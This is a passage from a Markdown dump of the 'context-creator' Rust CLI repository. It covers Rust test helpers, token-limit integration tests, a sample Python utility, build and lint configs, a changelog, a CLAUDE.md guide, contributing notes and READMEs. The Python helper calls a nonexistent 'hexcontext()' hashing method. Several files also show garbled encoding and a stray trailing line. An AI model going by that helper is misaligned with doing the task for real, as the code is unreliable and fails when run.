        .add_file(
            "c.rs",
            r#"
mod a;
use crate::a::func_a;

pub fn func_c() {
    println!("In func_c");
    // Would cause infinite recursion if called
    // func_a();
}
"#,
        )
        .build()
}

/// Create a deep dependency chain project
pub fn create_deep_dependency_chain(depth: usize) -> (TempDir, PathBuf) {
    let mut builder = TestProjectBuilder::new();

    for i in 0..depth {
        let content = if i == 0 {
            r#"
mod mod1;
use crate::mod1::func1;

fn main() {
    func1();
}
"#
            .to_string()
        } else if i < depth - 1 {
            format!(
                r#"
mod mod{};
use crate::mod{}::func{};

pub fn func{}() {{
    func{}();
}}
"#,
                i + 1,
                i + 1,
                i + 1,
                i,
                i + 1
            )
        } else {
            format!(
                r#"
pub fn func{i}() {{
    println!("End of chain at depth {i}");
}}
"#
            )
        };

        builder = builder.add_file(format!("mod{i}.rs"), &content);
    }

    builder.build()
}
```

## tests/token_limits_integration_test.rs

Imports: clap::Parser, context_creator::cli::Config, std::fs, tempfile::TempDir, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, fs, tempfile::TempDir.TempDir

```rust
use clap::Parser;
use context_creator::cli::Config;
use std::fs;
use tempfile::TempDir;

#[test]
fn test_token_limits_integration_with_config_file() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a config file with token limits
    let config_content = r#"
[defaults]
max_tokens = 150000

[tokens]
gemini = 2500000
codex = 1800000

[[priorities]]
pattern = "src/**/*.rs"
weight = 100.0
"#;

    fs::write(&config_path, config_content).unwrap();

    // Test Gemini with prompt (should use config token limit)
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "gemini",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), Some(2_500_000));

    // Test Codex with prompt (should use config token limit)
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "codex",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), Some(1_800_000));
}

#[test]
fn test_token_limits_explicit_override_config() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a config file with token limits
    let config_content = r#"
[tokens]
gemini = 2500000
codex = 1800000
"#;

    fs::write(&config_path, config_content).unwrap();

    // Explicit max_tokens should override config
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "gemini",
        "--max-tokens",
        "500000",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), Some(500_000));
}

#[test]
fn test_token_limits_partial_config() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a config file with only Gemini token limit
    let config_content = r#"
[tokens]
gemini = 3000000
# codex not specified
"#;

    fs::write(&config_path, config_content).unwrap();

    // Test Gemini (should use config)
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "gemini",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), Some(3_000_000));

    // Test Codex (should use hard-coded default)
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "codex",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), Some(1_000_000));
}

#[test]
fn test_token_limits_no_prompt_no_limits() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a config file with token limits
    let config_content = r#"
[tokens]
gemini = 2500000
codex = 1800000
"#;

    fs::write(&config_path, config_content).unwrap();

    // Without prompt, no token limits should be applied
    let mut config = Config::parse_from([
        "context-creator",
        "--tool",
        "gemini",
        "--config",
        config_path.to_str().unwrap(),
        temp_dir.path().to_str().unwrap(),
    ]);

    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), None);
}

#[test]
fn test_token_limits_precedence_order() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a config file with both defaults.max_tokens and tokens section
    let config_content = r#"
[defaults]
max_tokens = 150000

[tokens]
gemini = 2500000
codex = 1800000
"#;

    fs::write(&config_path, config_content).unwrap();

    // Test precedence: explicit > config tokens > defaults.max_tokens

    // 1. Explicit should win
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "gemini",
        "--max-tokens",
        "500000",
        "--config",
        config_path.to_str().unwrap(),
    ]);
    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), Some(500_000));

    // 2. Config tokens should win over defaults.max_tokens when prompt is present
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "gemini",
        "--config",
        config_path.to_str().unwrap(),
    ]);
    config.load_from_file().unwrap();
    assert_eq!(config.get_effective_max_tokens(), Some(2_500_000)); // From tokens section, not defaults
}

#[test]
fn test_token_limits_config_file_missing() {
    let temp_dir = TempDir::new().unwrap();
    let non_existent_config = temp_dir.path().join("missing.toml");

    // Should fail gracefully when config file doesn't exist
    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "gemini",
        "--config",
        non_existent_config.to_str().unwrap(),
    ]);

    // Should fail to load config
    assert!(config.load_from_file().is_err());
}

#[test]
fn test_token_limits_malformed_config() {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join(".context-creator.toml");

    // Create a malformed config file
    let config_content = r#"
[tokens]
gemini = "not_a_number"
codex = 1800000
"#;

    fs::write(&config_path, config_content).unwrap();

    let mut config = Config::parse_from([
        "context-creator",
        "--prompt",
        "test prompt",
        "--tool",
        "gemini",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    // Should fail to parse the malformed config
    assert!(config.load_from_file().is_err());
}
```

## examples/sample-mixed-project/src/utils.py

Imports: json, hashlib, datetime, typing, config

Type references: data, config_path, Any, config, Any, items, Any, Any, item, Any, Any

```python
#!/usr/bin/env python3
"""
Utility functions for the sample project
Demonstrates Python code in a mixed-language project
"""

import json
import hashlib
from datetime import datetime
from typing import Dict, List, Any


def generate_hash(data: str) -> str:
    """Generate SHA256 hash of input data."""
    return hashlib.sha256(data.encode()).hexcontext()


def parse_config(config_path: str) -> Dict[str, Any]:
    """Parse configuration from JSON file."""
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError as e:
        print(f"Error parsing config: {e}")
        return {}


class DataProcessor:
    """Process and transform data for the application."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.processed_count = 0
    
    def process_batch(self, items: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Process a batch of items."""
        results = []
        for item in items:
            processed = self._process_item(item)
            results.append(processed)
            self.processed_count += 1
        return results
    
    def _process_item(self, item: Dict[str, Any]) -> Dict[str, Any]:
        """Process a single item."""
        return {
            **item,
            'processed_at': datetime.utcnow().isoformat(),
            'hash': generate_hash(json.dumps(item)),
            'version': self.config.get('version', '1.0.0')
        }


if __name__ == "__main__":
    # Example usage
    sample_data = [
        {'id': 1, 'name': 'Item 1'},
        {'id': 2, 'name': 'Item 2'}
    ]
    
    processor = DataProcessor({'version': '1.0.0'})
    results = processor.process_batch(sample_data)
    
    print(json.dumps(results, indent=2))
```

## Cargo.toml

```toml
[package]
name = "context-creator"
version = "1.0.0"
edition = "2021"
description = "High-performance CLI tool to convert codebases to Markdown for LLM context"
authors = ["Matias Villaverde"]
repository = "https://github.com/matiasvillaverde/context-creator"
license = "MIT"
keywords = ["cli", "llm", "code", "context", "markdown"]
categories = ["command-line-utilities", "development-tools"]
readme = "README.md"

[dependencies]
anyhow = "1.0"
arboard = "3.2"
clap = { version = "4.5", features = ["derive"] }
dashmap = "5.5"
dirs = "5.0"
glob = "0.3"
ignore = "0.4"
itertools = "0.13"
lru = "0.12"
rayon = "1.10"
serde = { version = "1.0", features = ["derive"] }
tempfile = "3.10"
thiserror = "1.0"
tiktoken-rs = "0.5"
toml = "0.8"
tree-sitter = "0.20"
tree-sitter-rust = "0.20"
tree-sitter-javascript = "0.20"
tree-sitter-typescript = "0.20"
tree-sitter-python = "0.20"
tree-sitter-go = "0.20"
tree-sitter-java = "0.20"
walkdir = "2.5"
deadpool = "0.10"
async-trait = "0.1"
tokio = { version = "1", features = ["full"] }
moka = { version = "0.12", features = ["future"] }
petgraph = "0.6"

[dev-dependencies]
assert_cmd = "2.0"
criterion = { version = "0.5", features = ["html_reports"] }
predicates = "3.1"
tempfile = "3.10"

[profile.release]
lto = true
codegen-units = 1
strip = true
opt-level = 3

[[bench]]
name = "benchmarks"
harness = false
```

## clippy.toml

```toml
msrv = "1.74.0"

allow-unwrap-in-tests = true
allow-expect-in-tests = true
allow-dbg-in-tests = true
allow-print-in-tests = true

avoid-breaking-exported-api = false
standard-macro-braces = [
    { name = "format", brace = "(" },
    { name = "format_args", brace = "(" },
    { name = "vec", brace = "[" },
    { name = "matches", brace = "(" },
]

disallowed-names = ["foo", "bar", "baz", "quux", "tmp", "temp", "test"]
cognitive-complexity-threshold = 30
single-char-binding-names-threshold = 4
too-many-lines-threshold = 400
too-many-arguments-threshold = 5
type-complexity-threshold = 250
literal-representation-threshold = 16
enum-variant-name-threshold = 3
struct-field-name-threshold = 3
max-trait-bounds = 3
unreadable-literal-lint-fractions = false
```

## CHANGELOG.md

```markdown
# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- FileCache for eliminating redundant I/O operations
- Parallel token counting for improved performance
- Memory optimization with pre-allocated string buffers
- Performance benchmark for 1000 files
- Integration test verifying <1 second processing for 1000 files
- Enhanced `--include-types` functionality to include actual type definition files instead of just listing type names
- New `file_expander` module for expanding file lists based on semantic relationships
- Type reference extraction from Rust imports (including traits)
- Path validation security checks for expanded files
- Support for finding trait definitions when used as type references

### Changed
- Optimized file reading to eliminate 2-3x redundant I/O operations
- Improved token counting with parallel processing using rayon
- Enhanced memory efficiency in markdown generation
- **BREAKING**: Default `semantic_depth` changed from 3 to 2 for better performance with expanded file inclusion
- `TypeReference` struct enhanced with `definition_path`, `is_external`, and `external_package` fields
- File expansion now respects `semantic_depth` limit to prevent unbounded traversal

### Performance
- Reduced processing time for 1000 files from >5 seconds to <100ms (50x improvement)
- Eliminated redundant file reads through shared caching
- Reduced memory allocations with pre-sized string buffers
- File expansion uses FileCache to avoid redundant I/O when searching for type definitions

## [0.3.0] - 2025-01-12

### Added
- New `--prompt` / `-p` flag for specifying prompts with spaces
- Support for reading prompts from stdin (via pipe or `--stdin` flag)
- Positional arguments for directories (can now use `context-creator dir1 dir2 dir3`)
- Automatic stdin detection when input is piped
- Improved backward compatibility for existing command patterns

### Changed
- Enhanced CLI argument parsing with more flexible prompt and directory specification
- Better separation between prompt and directory arguments

## [0.2.0] - 2025-01-11

### Added
- Support for processing multiple directories in a single command
- Enhanced output formatting for multiple directory results
- Improved Windows CI test compatibility

### Fixed
- Windows test failures due to executable mocking limitations
- Clippy warnings about unused variables on Windows platform

## [0.1.1] - 2024-12-14

### Added
- Initial release of context-creator
- Core functionality for directory traversal
- Markdown generation from source code
- Token counting with tiktoken-rs
- File prioritization system
- Integration with gemini
- Support for .gitignore and .contextignore
- Configuration file support
- CLI interface with comprehensive options
- Parallel processing for performance
- Binary file detection and skipping

### Security
- Path traversal protection
- Safe handling of symbolic links

## [0.1.0] - 2024-12-13

### Added
- First public release

[Unreleased]: https://github.com/matiasvillaverde/context-creator/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/matiasvillaverde/context-creator/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/matiasvillaverde/context-creator/compare/v0.1.1...v0.2.0
[0.1.1]: https://github.com/matiasvillaverde/context-creator/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/matiasvillaverde/context-creator/releases/tag/v0.1.0
```

## CLAUDE.md

```markdown
# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Overview

context-creator is a high-performance Rust CLI tool that converts entire codebases into LLM-optimized Markdown for consumption by models like Gemini. It processes git repositories by intelligently filtering, prioritizing, and formatting code into a single cohesive document.

## Key Commands

### Development Commands
```bash
# Build and run validations (format check + lint)
make build

# Run tests with validation
make test

# Run in development mode with example
make dev

# Install locally
make install

# Generate documentation
make doc
```

### Quality & CI Commands
```bash
# Format code
make fmt

# Check formatting (CI)
make fmt-check

# Lint with clippy
make lint

# Run all validation checks
make validate

# Generate test coverage
make coverage
```

### Testing Commands
```bash
# Run all tests
cargo test

# Run specific test
cargo test test_name

# Run tests with specific features
cargo test --all-targets

# Run benchmarks
cargo bench
```

## Project Architecture

### Core Components

1. **CLI Layer (`src/cli.rs`)**
   - Command-line argument parsing using clap
   - Configuration validation and loading
   - Supports multiple input sources: directories, glob patterns, GitHub repos

2. **Core Processing (`src/core/`)**
   - `walker.rs`: Directory traversal with .gitignore support and custom filtering
   - `context_builder.rs`: Markdown generation with token management
   - `prioritizer.rs`: File prioritization based on importance and token limits
   - `semantic/`: Language-aware semantic analysis for imports and dependencies
   - `cache.rs`: File caching for performance optimization

3. **Configuration System (`src/config.rs`)**
   - TOML-based configuration with `.context-creator.toml`
   - Support for custom priorities, token limits, and ignore patterns
   - Hierarchical configuration loading (CLI > config file > defaults)

4. **Semantic Analysis (`src/core/semantic/`)**
   - Multi-language AST parsing using tree-sitter
   - Import tracing and dependency resolution
   - Language-specific analyzers in `languages/` directory
   - Supports 20+ programming languages

### Key Data Flow

1. **Input Processing**: CLI args â†’ Config validation â†’ Directory resolution
2. **File Discovery**: Walker scans directories â†’ Applies ignore patterns â†’ Filters by include patterns
3. **Semantic Analysis**: Optional import tracing â†’ Dependency resolution â†’ Enhanced file relationships
4. **Prioritization**: File importance scoring â†’ Token budget allocation â†’ Selection for output
5. **Output Generation**: Markdown formatting â†’ Token counting â†’ Final document assembly

### Configuration Files

- `.contextignore`: Exclude files/directories (gitignore syntax)
- `.contextkeep`: Prioritize important files
- `.context-creator.toml`: Advanced configuration (priorities, token limits, defaults)

### Token Management

The tool implements sophisticated token budget management:
- Automatic token counting using tiktoken-rs
- Prompt token reservation for LLM interactions
- Intelligent file truncation and selection
- Per-LLM token limit configuration

### Semantic Features

- **Import Tracing**: Follow import chains across files
- **Caller Analysis**: Find functions that call specific modules
- **Type Dependencies**: Include type definitions and interfaces
- **Multi-language Support**: Unified analysis across different languages

## Important Implementation Details

### Error Handling
- Uses `anyhow` for error propagation
- Custom error types in `src/utils/error.rs`
- Comprehensive validation at multiple levels

### Performance Optimizations
- Parallel processing with rayon
- File caching to avoid re-reading
- Tree-sitter parser pooling
- LRU caching for AST parsing

### Testing Strategy
- Unit tests for core functionality
- Integration tests for CLI combinations
- Performance benchmarks
- Semantic analysis stress tests
- Security vulnerability tests

## Development Notes

### Adding New Languages
Language support is added in `src/core/semantic/languages/`:
1. Implement language-specific analyzer
2. Add tree-sitter grammar dependency
3. Update language registry in `mod.rs`

### Configuration Precedence
1. Explicit CLI arguments (highest priority)
2. Config file token limits (for prompts)
3. Config file defaults
4. Hard-coded defaults (lowest priority)

### File Prioritization
Base file type priorities can be customized via config file using glob patterns. Uses "first-match-wins" evaluation order.
```

## CONTRIBUTING.md

```markdown
# Contributing to context-creator

First off, thank you for considering contributing to context-creator! It's people like you that make context-creator such a great tool.

## ðŸ¤ Code of Conduct

This project and everyone participating in it is governed by our Code of Conduct. By participating, you are expected to uphold this code. Please report unacceptable behavior to the project maintainers.

## ðŸš€ Getting Started

### Prerequisites

- Rust 1.74.0 or later
- Git
- Make (optional but recommended)

### Setting Up Your Development Environment

1. Fork the repository on GitHub
2. Clone your fork locally:
   ```bash
   git clone https://github.com/YOUR_USERNAME/context-creator.git
   cd context-creator
   ```

3. Add the upstream repository:
   ```bash
   git remote add upstream https://github.com/matiasvillaverde/context-creator.git
   ```

4. Create a new branch for your feature/fix:
   ```bash
   git checkout -b feature/your-feature-name
   ```

5. Install development dependencies:
   ```bash
   cargo build
   ```

## ðŸ”§ Development Workflow

### Running Tests

```bash
# Run all tests
make test

# Run specific test
cargo test test_name

# Run tests with output
cargo test -- --nocapture
```

### Code Formatting

We use `rustfmt` for consistent code formatting:

```bash
# Format your code
make fmt

# Check formatting without changes
make fmt-check
```

### Linting

We use `clippy` for catching common mistakes:

```bash
# Run clippy
make lint

# Run with pedantic lints
cargo clippy -- -W clippy::pedantic
```

### Running All Checks

Before submitting a PR, run all checks:

```bash
make validate
```

## ðŸ“ Making Changes

### Code Style

- Follow Rust naming conventions
- Use meaningful variable and function names
- Add comments for complex logic
- Keep functions focused and small
- Write unit tests for new functionality

### Commit Messages

We follow conventional commits:

- `feat:` New features
- `fix:` Bug fixes
- `docs:` Documentation changes
- `test:` Test additions/changes
- `chore:` Maintenance tasks
- `perf:` Performance improvements
- `refactor:` Code refactoring

Example:
```
feat: add support for custom ignore patterns

- Implement .contextignore file parsing
- Add tests for ignore pattern matching
- Update documentation
```

### Testing

- Write tests for all new functionality
- Ensure all tests pass before submitting
- Include both unit and integration tests where appropriate
- Test edge cases and error conditions

## ðŸŽ¯ Pull Request Process

1. Update documentation for any changed functionality
2. Add tests for your changes
3. Ensure all tests pass
4. Update the README.md if needed
5. Submit a pull request with a clear description

### PR Checklist

- [ ] Tests pass locally
- [ ] Code is formatted (`make fmt`)
- [ ] Lints pass (`make lint`)
- [ ] Documentation is updated
- [ ] Commit messages follow conventions
- [ ] PR description explains the changes

## ðŸ—ï¸ Architecture Guidelines

### Module Organization

- `cli.rs` - CLI argument parsing only
- `core/` - Core business logic
- `utils/` - Shared utilities
- Keep modules focused on a single responsibility

### Error Handling

- Use `thiserror` for custom error types
- Use `anyhow` for error propagation
- Provide helpful error messages for users
- Handle edge cases gracefully

### Performance Considerations

- Use `rayon` for parallelizable operations
- Avoid unnecessary allocations
- Profile before optimizing
- Document performance-critical code

## ðŸ“š Documentation

### Code Documentation

- Add doc comments (`///`) for public APIs
- Include examples in doc comments
- Document complex algorithms
- Keep documentation up to date

### User Documentation

- Update README.md for user-facing changes
- Add examples for new features
- Document configuration options
- Include troubleshooting tips

## ðŸ› Reporting Issues

### Before Submitting an Issue

- Check existing issues for duplicates
- Try the latest version
- Collect relevant information:
  - Rust version (`rustc --version`)
  - Operating system
  - Steps to reproduce
  - Error messages

### Issue Template

```markdown
## Description
Brief description of the issue

## Steps to Reproduce
1. Run command X
2. See error Y

## Expected Behavior
What should happen

## Actual Behavior
What actually happens

## Environment
- OS: [e.g., macOS 13.0]
- Rust: [e.g., 1.74.0]
- context-creator version: [e.g., 0.1.0]
```

## ðŸ’¡ Suggesting Features

We love feature suggestions! Please provide:

- Use case description
- Proposed solution
- Alternative solutions considered
- Any implementation ideas

## ðŸŽ‰ Recognition

Contributors will be recognized in:
- The project README
- Release notes
- GitHub contributors page

## ðŸ“§ Questions?

Feel free to:
- Open a discussion on GitHub
- Ask in issues (tag as "question")
- Contact maintainers directly

## ðŸš€ Release Process

1. Update version in `Cargo.toml`
2. Update CHANGELOG.md
3. Create a PR with version bump
4. After merge, tag the release
5. GitHub Actions will build and publish

Thank you for contributing to context-creator! ðŸ™
```

## README.md

```markdown
# context-creator 
> Turn your entire codebase into context. 

[![CI](https://github.com/matiasvillaverde/context-creator/actions/workflows/ci.yml/badge.svg)](https://github.com/matiasvillaverde/context-creator/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Rust](https://img.shields.io/badge/rust-%23000000.svg?style=flat&logo=rust&logoColor=white)](https://www.rust-lang.org/)

`context-creator` transforms your entire git repository into a single, LLM-optimized Markdown fileâ€”intelligently compressed and prioritizedâ€”so you can feed it directly into Geminiâ€™s(or any LLM) long-context window for fast, high-level insights and deep architectural understanding.

-----

## Quick Start

```bash
# Ask about improving your local project
context-creator --prompt "Based on this codebase, suggest three ways I can improve performance."

# Ask about architectural patterns in a remote repo
context-creator --repo https://github.com/coderamp-labs/gitingest --prompt "What are the main architectural patterns here? Compare them to common Python best practices."

# Save the formatted Markdown to a file
context-creator -o context.md
```

### Common Use Cases

```bash
# Architecture Review
`context-creator --prompt "Generate a mermaid diagram representing the high-level architecture."`

# Onboarding New Developers
`context-creator --prompt "I'm a new developer. Give me a tour of this codebase, explaining the purpose of the top 5 most important files."`

# Implementing Features
`context-creator --prompt "I need to add a new authentication method using Passkeys. Which files will I need to modify? Provide a step-by-step plan."`

# Security Audit
`context-creator --prompt "Analyze these dependencies and the core logic for potential security vulnerabilities."`
```

### Why `context-creator`?

 #### Geminiâ€™s Long Context
> Stop pasting small snippets. Feed your entire codebase to Gemini in one go and ask **big-picture questions**.

#### Blazing Fast
> Built in Rust with parallel processing, `context-creator` is **dramatically faster** at contexting large repositories.

#### Smart Token Management
> Itâ€™s more than a `cat`. `context-creator` respects `.gitignore`, prioritizes critical files via `.contextkeep`, and trims intelligently based on token budgets.

#### Give Claude Code Superpowers
> Claude already excels at precise work. Teach it to use `context-creator`, and it gains a **satellite-level** view of your entire codebaseâ€”unlocking deeper context, better answers, and faster development cycles.


## Installation

#### 1\. Install `context-creator`

```bash
# Using Cargo
cargo install context-creator
```

**Prerequisite:** Ensure you have the [Gemini CLI](https://github.com/google/gemini-cli) or [Codex](https://github.com/openai/codex) installed and configured.

#### 2\. Install Gemini CLI (Required for piping)

```bash
npm install -g @google/gemini-cli
gcloud auth application-default login
```

### More Usage Examples

```bash
# Save to file for later use
context-creator -o context.md

# Process specific directories (positional arguments)
context-creator src/ tests/ docs/

# Process specific directories (explicit include flags)
context-creator --include src/ --include tests/ --include docs/

# Process files matching glob patterns (QUOTE patterns to prevent shell expansion)
context-creator --include "**/*.py" --include "src/**/*.{rs,toml}"

# Process specific file types across all directories
context-creator --include "**/*repository*.py" --include "**/test[0-9].py"

# Combine prompt with include patterns for targeted analysis
context-creator --prompt "Review security" --include "src/auth/**" --include "src/security/**"

# Use ignore patterns to exclude unwanted files
context-creator --include "**/*.rs" --ignore "target/**" --ignore "**/*_test.rs"

# Combine prompt with ignore patterns
context-creator --prompt "Analyze core logic" --ignore "tests/**" --ignore "docs/**"

# Process with token limit
context-creator --include src/ --max-tokens 100000
```

## Glob Patterns

Both `--include` and `--ignore` flags support powerful glob patterns for precise file filtering:

### Supported Pattern Syntax

- `*` - matches any characters except `/`
- `?` - matches any single character except `/`
- `**` - recursive directory matching
- `[abc]` - character sets and ranges `[a-z]`
- `{a,b}` - brace expansion (alternatives)
- `[!abc]` - negated character sets

### Pattern Examples

```bash
# Include patterns
context-creator --include "*.py"                              # All Python files
context-creator --include "**/*.rs"                           # All Rust files recursively
context-creator --include "src/**/*.{py,js,ts}"              # Multiple file types in src
context-creator --include "**/*{repository,service,model}*.py" # Specific patterns
context-creator --include "**/test[0-9].py"                  # Numbered test files
context-creator --include "**/db/**"                         # All files in database directories

# Ignore patterns
context-creator --ignore "target/**"                         # Ignore Rust build artifacts
context-creator --ignore "node_modules/**"                   # Ignore Node.js dependencies
context-creator --ignore "**/*_test.rs"                      # Ignore test files
context-creator --ignore "*.{log,tmp,bak}"                   # Ignore temporary files
context-creator --ignore "docs/**"                           # Ignore documentation

# Combined patterns
context-creator --include "**/*.rs" --ignore "target/**" --ignore "**/*_test.rs"
```

### âš ï¸ Important: Shell Expansion Prevention

**Always quote your glob patterns** to prevent shell expansion:

```bash
# âœ… CORRECT - quoted pattern
context-creator --include "**/*.py"

# âŒ WRONG - shell may expand before reaching application
context-creator --include **/*.py
```

## Configuration

Fine-tune how `context-creator` processes your repository:

  * **`.contextignore`:** Exclude non-essential files and folders (e.g., `node_modules/`, `target/`).
  * **`.contextkeep`:** Prioritize critical files (e.g., `src/main.rs`, `Cargo.toml`). This ensures the most important code is included when you're near the token limit.
  * **`.context-creator.toml`:** For advanced configuration like setting default token limits and priority weights.

### .contextignore

Exclude files from processing:

```gitignore
# Dependencies
node_modules/
target/
vendor/

# Build artifacts
dist/
build/
*.pyc

# Sensitive files
.env
secrets/
```

### .contextkeep

Prioritize important files:

```gitignore
# Core functionality
src/main.*
src/core/**/*.rs

# Important configs
Cargo.toml
package.json
```

### Configuration File (.context-creator.toml)

```toml
[defaults]
max_tokens = 150000
progress = true

[tokens]
gemini = 2000000
codex = 1500000

[[priorities]]
pattern = "src/**/*.rs"
weight = 100

[[priorities]]
pattern = "tests/**/*.rs"
weight = 50
```

### Token Limits Configuration

`context-creator` now supports LLM-specific token limits via the `[tokens]` section in your configuration file. This feature provides smart defaults when using the `--prompt` flag:

**Token Limit Precedence:**
1. **Explicit CLI** (`--max-tokens 500000`) - Always takes precedence
2. **Config Token Limits** (`[tokens]` section) - Used when prompts are provided
3. **Config Defaults** (`[defaults].max_tokens`) - Used for non-prompt operations
4. **Hard-coded Defaults** (1,000,000 tokens) - Fallback for prompts when no config

```toml
# Example: Configure different limits per LLM
[tokens]
gemini = 2000000    # 2M tokens for Gemini
codex = 1500000     # 1.5M tokens for Codex

[defaults]
max_tokens = 150000  # For non-prompt operations
```

**Usage Examples:**
```bash
# Uses config token limits (2M for Gemini, with prompt reservation)
context-creator --prompt "Analyze this codebase" --tool gemini

# Explicit override (500K total, with prompt reservation)
context-creator --prompt "Quick review" --max-tokens 500000

# Uses config defaults (150K for file output, no reservation needed)
context-creator --output-file context.md
```

### Smart Prompt Token Reservation

When using prompts, `context-creator` automatically reserves tokens for:
- **Prompt tokens** (measured using tiktoken)
- **Safety buffer** (1000 tokens for LLM response)

This ensures the total input (prompt + codebase context) fits within the LLM's context window:

```bash
# Example: 2M token limit with 50-token prompt
# Available for codebase: 2,000,000 - 50 - 1,000 = 1,998,950 tokens
context-creator --prompt "Analyze this code" --tool gemini
```
# Security fixes applied
```

## docs/README.md

```markdown
# Code context Documentation

Welcome to the context-creator documentation! This high-performance CLI tool converts codebases to Markdown format optimized for Large Language Model (LLM) consumption.

## Quick Links

- [Installation Guide](installation.md)
- [Usage Guide](usage.md)
- [Configuration Reference](configuration.md)
- [API Reference](api.md)
- [Examples](examples.md)
- [Troubleshooting](troubleshooting.md)
- [Contributing](../CONTRIBUTING.md)

## What is Code context?

Code context is a Rust-based CLI tool that:

- **Converts** entire codebases to structured Markdown
- **Prioritizes** files based on importance and token limits
- **Optimizes** output for LLM context windows
- **Supports** 20+ programming languages
- **Integrates** with LLM CLI tools (gemini, codex)
- **Processes** projects in parallel for maximum performance

## Key Features

### ðŸš€ **High Performance**
- Parallel file processing with Rayon
- Intelligent token counting with tiktoken-rs
- Memory-efficient streaming for large projects
- Benchmark: 2.4K files/sec end-to-end processing

### ðŸŽ¯ **Smart Prioritization**
- File importance scoring based on type and location
- Token limit enforcement with optimal file selection
- Configurable priority weights and patterns
- Automatic structure overhead calculation

### âš™ï¸ **Flexible Configuration**
- TOML configuration files with inheritance
- CLI argument overrides
- .contextignore support (like .gitignore)
- Environment variable integration

### ðŸ”§ **LLM Integration**
- Direct integration with gemini and codex
- Optimized token usage for context windows
- Structured output with table of contents
- File tree visualization

### ðŸ§ª **Production Ready**
- Comprehensive test suite (77 tests)
- CI/CD with GitHub Actions
- Release automation
- Performance benchmarks

## Quick Start

```bash
# Install
cargo install context-creator

# Basic usage
context-creator -d /path/to/project -o project.md

# With token limits
context-creator -d /path/to/project --max-tokens 50000 -o project.md

# Direct LLM integration
context-creator -d /path/to/project "Explain the architecture of this codebase"

# With configuration
context-creator -d /path/to/project -c config.toml -o project.md
```

## Use Cases

### ðŸ“‹ **Code Review & Analysis**
- Generate comprehensive project overviews
- Create documentation for legacy codebases
- Prepare code for AI-assisted reviews
- Export codebases for external analysis

### ðŸ¤– **LLM Context Preparation**
- Convert projects for ChatGPT/GPT-4 analysis
- Prepare context for code generation tasks
- Create training data for custom models
- Generate structured prompts for AI tools

### ðŸ“š **Documentation & Knowledge Transfer**
- Create onboarding materials for new developers
- Generate technical documentation automatically
- Export codebases for architecture discussions
- Prepare materials for technical interviews

### ðŸ” **Project Understanding**
- Quickly understand unfamiliar codebases
- Generate project summaries and insights
- Identify key components and dependencies
- Analyze code patterns and structures

## Architecture Overview

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   CLI Parser    â”‚â”€â”€â”€â–¶â”‚  Configuration   â”‚â”€â”€â”€â–¶â”‚ Directory Walkerâ”‚
â”‚   (clap)        â”‚    â”‚  (TOML + Args)   â”‚    â”‚   (walkdir)     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                                         â”‚
